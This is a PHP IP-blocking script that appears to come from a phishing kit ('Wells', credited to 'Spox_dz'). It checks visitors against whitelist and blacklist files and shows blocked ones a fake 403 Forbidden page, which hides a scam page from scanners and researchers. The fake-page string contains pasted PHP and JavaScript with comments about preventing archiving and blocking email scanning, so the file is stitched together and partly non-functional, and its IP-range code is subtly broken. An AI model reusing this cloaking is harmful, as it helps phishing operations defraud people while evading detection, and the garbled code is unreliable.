<?php
error_reporting(0);
/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Wells -
 * version 1.0
 * Https://facebook.com/hackeeeed.html
 * icq+teleg = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2019 Wells             $#
###############################################

**/

$ips = array($_SERVER['REMOTE_ADDR'],);
$checklist = new IpBlockList( );

$random_id = sha1(rand(0,1000000));

foreach ($ips as $ip ) {
  $result = $checklist->ipPass( $ip );
  if (!$result) {
    $msg = "FAILED: ".$checklist->message();
        header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Expires: " . gmdate("D, d M Y H:i:s", time() - 3600) . " GMT");
header("Pragma: no-cache");

// Prevent Google Archiving
header("X-Robots-Tag: noarchive");

// Block email scanning
header("X-Content-Type-Options: nosniff");

// Disable listeners and log third-party communications
ini_set("disable_functions", "socket_accept, socket_bind, socket_listen, socket_create_listen, socket_read, socket_recv, socket_recvfrom, socket_recvmsg, socket_send, socket_sendmsg, socket_sendto, socket_getsockname, socket_getpeername, socket_get_option, socket_set_option");


// Logging third-party communication attempts
$logFile = "../../../requests.txt"; // Replace with the path to your log file

// Get the current timestamp
$timestamp = date("Y-m-d H:i:s");

// Get the IP address of the client
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Get the requested URL
$requestUrl = $_SERVER['REQUEST_URI'];

// Create the log message
$logMessage = "Timestamp: $timestamp | IP: $ipAddress | Requested URL: $requestUrl\n";

// Append the log message to the log file
file_put_contents($logFile, $logMessage, FILE_APPEND);
?>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html><head><title>403 Forbidden</title>  <script>
    // Disable caching for forward and backward navigation
    function disableCaching() {
      // Disable caching for forward navigation
      window.onpageshow = function(event) {
        if (event.persisted) {
          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
        }
      };
      
      // Disable caching for backward navigation
      window.onunload = function() {};
    }
    
    // Set client browser cache to one hour prior
    function setBrowserCacheTime() {
      const date = new Date();
      date.setTime(date.getTime() - (60 * 60 * 1000));
      document.getElementById('cacheExpires').content = date.toUTCString();
    }

    // Prevent Google Archiving
    const metaRobots = document.createElement('meta');
    metaRobots.name = 'robots';
    metaRobots.content = 'noarchive';
    document.head.appendChild(metaRobots);

    // Block email scanning
    const metaContentType = document.createElement('meta');
    metaContentType.httpEquiv = 'X-Content-Type-Options';
    metaContentType.content = 'nosniff';
    document.head.appendChild(metaContentType);

    // Disable listeners and log third-party communications
    function disableListeners() {
      // Disable listeners (Not applicable in HTML pages)
    }

    function logThirdPartyCommunication() {
      // Logging third-party communication attempts
      const timestamp = new Date().toISOString();
      const ipAddress = "123.45.67.89"; // Replace with actual IP address or retrieve dynamically
      const requestedUrl = window.location.href;
      const logMessage = `Timestamp: ${timestamp} | IP: ${ipAddress} | Requested URL: ${requestedUrl}\n`;

      // Specify the log file location
      const logFile = "../../../requests.txt"; // Replace with the actual log file location

      // Perform the necessary logging operation (e.g., sending log data to a server-side script)
      const logRequest = new XMLHttpRequest();
      logRequest.open('POST', logFile, true);
      logRequest.setRequestHeader('Content-Type', 'text/plain');
      logRequest.send(logMessage);
    }

    // Call the necessary functions when the page loads
    document.addEventListener('DOMContentLoaded', function() {
      disableCaching();
      setBrowserCacheTime();
      disableListeners();
      logThirdPartyCommunication();
    });
  </script></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
        exit();
  }
}

class IpList {

  private $iplist = array();
  private $ipfile = "";

  public function __construct( $list ) {
    $contents = array();
    $this->ipfile = $list;
    $lines = $this->read( $list );
    foreach( $lines as $line ) {
      $line = trim( $line );
      # remove comment and blank lines
      if ( empty($line ) ) {
        continue;
      }
      if ( $line[0] == '#' ) {
        continue;
      }
      # remove on line comments
      $temp = explode( "#", $line );
      $line = trim( $temp[0] );
      # create content array
      $contents[] = $this->normal($line);
    }
    $this->iplist = $contents;
  }

  public function __destruct() {
  }

  public function __toString() {
    return implode(' ',$this->iplist);
  }

  public function is_inlist( $ip ) {
    $retval = false;
    foreach( $this->iplist as $ipf ) {
      $retval = $this->ip_in_range( $ip, $ipf );
      if ($retval === true ) {
        $this->range = $ipf;
        break;
      }
    }
    return $retval;
  }

  /*
  ** public function that returns the ip list array
  */
  public function iplist() {
    return $this->iplist;
  }

  /*
  */
  public function message() {
    return $this->range;
  }

  public function append( $ip, $comment ) {
        return file_put_contents( $this->ipfile, $ip, $comment );
  }

  public function listname() {
        return $this->ipfile;
  }

  /*
  ** private function that reads the file into array
  */
  private function read( $fname ) {
    try {
      $file = file( $fname, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES  );
    }
    catch( Exception $e ) {
      throw new Exception( $fname.': '.$e->getmessage() . '\n');
    }
    return $file;
  }

  private function ip_in_range( $ip, $range ) {

    // return ip_in_range( $ip, $range );

        if ( strpos($range, '/') !== false ) {
            // IP/NETMASK format
            list( $range, $netmask ) = explode( '/', $range, 2 );
            if ( strpos( $netmask, '.' ) !== false ) {
                // 255.255.255.0 format w/ wildcards
                $netmask = str_replace('*', '0', $netmask );
                $dnetmask = ip2long( $netmask );
                return ((ip2long( $ip ) & $dnetmask) == (ip2long($range) & $dnetmask ));
            }
            else {
                // IP/CIDR format
                // insure $range format 0.0.0.0
                $r = explode( '.', $range );
                while( count( $r ) < 4 ) {
                    $r[] = '0';
                }
                for($i = 0; $i < 4; $i++) {
                    $r[$i] = empty($r[$i]) ? '0': $r[$i];
                }
                $range = implode( '.', $r );
                // build netmask
                $dnetmask = ~(pow( 2, ( 32 - $netmask)) - 1);
                return ((ip2long($ip) & $dnetmask)==(ip2long($range) & $dnetmask));
            }
        }
        else {
            if ( strpos( $range, '*' ) !== false ) {
                // 255.255.*.* format
                $low = str_replace( '*', '0', $range );
                $high = str_replace( '*', '255', $range );
                $range = $low.'-'.$high;
            }
            if ( strpos( $range, '-') !== false ) {
                // 128.255.255.0-128.255.255.255 format
                list( $low, $high ) = explode( '-', $range, 2 );

                $dlow  = $this->toLongs( $low );
                $dhigh = $this->toLongs( $high );
                $dip   = $this->toLongs( $ip );
                return (($this->compare($dip,$dlow) != -1) && ($this->compare($dip,$dhigh) != 1));
            }
        }
        return ( $ip == $range );
  }

  private function normal( $range ) {
    if ( strpbrk( "*-/", $range ) === False ) {
      $range .= "/32";
    }
    return str_replace( ' ', '', $range );
  }

  private function toLongs( $ip ) {
    # $Ip = $this->expand();
    # $Parts = explode(':', $Ip);
    $Parts = explode('.', $ip );
    $Ip = array('', '');
    # for ($i = 0; $i < 4; $i++) {
    for ($i = 0; $i < 2; $i++){
      $Ip[0] .= str_pad(base_convert($Parts[$i], 16, 2), 16, 0, STR_PAD_LEFT);
    }
    # for ($i = 4; $i < 8; $i++) {
    for ($i = 2; $i < 4; $i++) {
      $Ip[1] .= str_pad(base_convert($Parts[$i], 16, 2), 16, 0, STR_PAD_LEFT);
    }
        return array(base_convert($Ip[0], 2, 10), base_convert($Ip[1], 2, 10));
  }

  private function compare( $ipdec1, $ipdec2 ) {
        if( $ipdec1[0] < $ipdec2[0] ) {
            return -1;
        }
        elseif ( $ipdec1[0] > $ipdec2[0] ) {
            return 1;
        }
        elseif ( $ipdec1[1] < $ipdec2[1] ) {
            return -1;
        }
        elseif ( $ipdec1[1] > $ipdec2[1] ) {
            return 1;
        }
        return 0;
  }
}

class IpBlockList {

    private $statusid = array( 'negative' => -1, 'neutral' => 0, 'positive' => 1 );

  private $whitelist = array();
  private $blacklist = array();
  private $message   = NULL;
  private $status    = NULL;

  public function __construct( $whitelistfile = 'whitelist.dat',
                  $blacklistfile = 'blacklist.dat' ) {
    $this->whitelistfile = $whitelistfile;
    $this->blacklistfile = $blacklistfile;

    $this->whitelist = new IpList( $whitelistfile );
    $this->blacklist = new IpList( $blacklistfile );
  }

  public  function    __destruct() {
  }

  public function ipPass( $ip ) {
    $retval = False;

    if ( !filter_var( $ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 ) ) {
            throw new Exception( 'Requires valid IPv4 address' );
    }

    if ( $this->whitelist->is_inlist( $ip ) ) {
      // Ip is white listed, so it passes
      $retval = True;
      $this->message = $ip . " is whitelisted by ".$this->whitelist->message().".";
      $this->status = $this->statusid['positive'];
    }
    else if ( $this->blacklist->is_inlist( $ip ) ) {
      $retval = False;
      $this->message = $ip . " is blacklisted by ".$this->blacklist->message().".";
      $this->status = $this->statusid['negative'];
    }
    else {
      $retval = True;
      $this->message = $ip . " is unlisted.";
      $this->status = $this->statusid['neutral'];
    }
    return $retval;
  }

  public function message() {
    return $this->message;
  }

         public function status() {
             return $this->status;
         }

  public function append( $type, $ip, $comment = "" ) {
        if ($type == 'WHITELIST' ) {
            $retval = $this->whitelistfile->append( $ip, $comment );
        }
        elseif( $type == 'BLACKLIST' ) {
            $retval = $this->blacklistfile->append( $ip, $comment );
        }
        else {
            $retval = false;
        }
  }

  public function filename( $type, $ip, $comment = "" ) {
        if ($type == 'WHITELIST' ) {
            $retval = $this->whitelistfile->filename( $ip, $comment );
        }
        elseif( $type == 'BLACKLIST' ) {
            $retval = $this->blacklistfile->filename( $ip, $comment );
        }
        else {
            $retval = false;
        }
  }
}
